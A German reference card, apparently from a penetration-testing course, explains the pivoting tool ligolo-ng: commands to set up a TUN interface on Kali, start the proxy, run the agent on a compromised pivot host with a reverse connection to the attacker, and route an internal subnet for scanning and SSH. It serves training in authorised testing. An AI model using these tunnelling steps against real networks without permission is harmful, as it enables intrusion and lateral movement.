# ligolo-ng

**Kategorie:** Pivoting (TUN-basiert, „VPN-artig")

Erzeugt auf dem Angreifer ein **TUN-Interface**; man routet das interne Subnetz dorthin und erreicht es **wie per VPN** – ohne proxychains, inkl. ICMP und allen TCP/UDP-Protokollen. Komfortabel für mehrstufiges Pivoting. Reverse-Verbindung (Agent → Proxy).

```bash
# Angreifer (Proxy):
./proxy -selfcert
# Pivot (Agent):
./agent -connect <KALI>:11601 -ignore-cert
```

## Setup / Ablauf

```bash
# 1) TUN-Interface anlegen (Kali):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
# 2) Proxy starten:
./proxy -selfcert               # lauscht :11601
# 3) Agent auf Pivot starten (reverse):
./agent -connect <KALI>:11601 -ignore-cert
# 4) in der Proxy-Konsole:
session                         # Agent auswählen
start                           # Tunnel aktivieren
# 5) Route ins interne Segment (Kali):
sudo ip route add 192.168.20.0/24 dev ligolo
```
Danach **direkt**: `nmap -sT 192.168.20.50`, `ssh user@192.168.20.50` – ohne proxychains.

## Features

Listener/Port-Forwards (`listener_add`), mehrstufiges Pivoting (Agent hinter Agent), Reverse-Connect (firewall-freundlich).

## Hinweis

Benötigt TUN + Routing (root lokal); Agent-Binary zur Ziel-Arch. Nur eigene/freigegebene Umgebung. Komfortabler als Chisel/proxychains, wenn man „echtes" Routing will.

## Verwendet in

post-exploitation-pivoting 06 (Chisel & Ligolo), 07 (Lateral Movement), 10.
